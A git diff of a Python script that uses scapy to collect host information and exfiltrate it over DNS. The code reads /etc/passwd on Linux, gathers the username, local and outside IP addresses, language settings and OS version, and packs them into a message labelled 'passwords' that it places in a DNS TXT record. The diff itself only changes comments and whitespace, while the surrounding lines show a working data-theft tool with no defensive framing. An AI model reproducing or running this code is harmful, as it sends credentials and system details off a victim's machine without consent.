@@ -14,7 +14,8 @@ from scapy.layers.dns import DNS
 from scapy.layers.dns import DNSRR, DNSQR
         
 if __name__ == "__main__":        
-        
+    #geting info from user:
+
     # print(os.name) #posix for linux ot nt for windows
     if (os.name == "posix"): # linux
         with open("/etc/passwd", "rb") as f:
@@ -57,6 +58,7 @@ if __name__ == "__main__":
 
 
     #dns sending
+
     message = "passwords: " + str(pass_file) + "\\nusername: " +  username + "\\nlocal IP: " + inside_ip + "\\noutside IP: " + outside_ip + "\\navailable_languages: " + str(available_languages) + "\\nuser language: " + user_language + "\\nOS version: " + version
 
 
@@ -68,11 +70,10 @@ if __name__ == "__main__":
         qd=DNSQR(qname="example.com")  # Set the query domain name
     )
 
-    # Create DNS Resource Record layer with the desired message
     dnsrr_layer = DNSRR(
-        rrname="example.com",  # Resource record domain name
-        type="TXT",  # Resource record type: TXT
-        rdata= message  # Message text
+        rrname="example.com",
+        type="TXT", 
+        rdata= message
     )
 
     # Create UDP layer
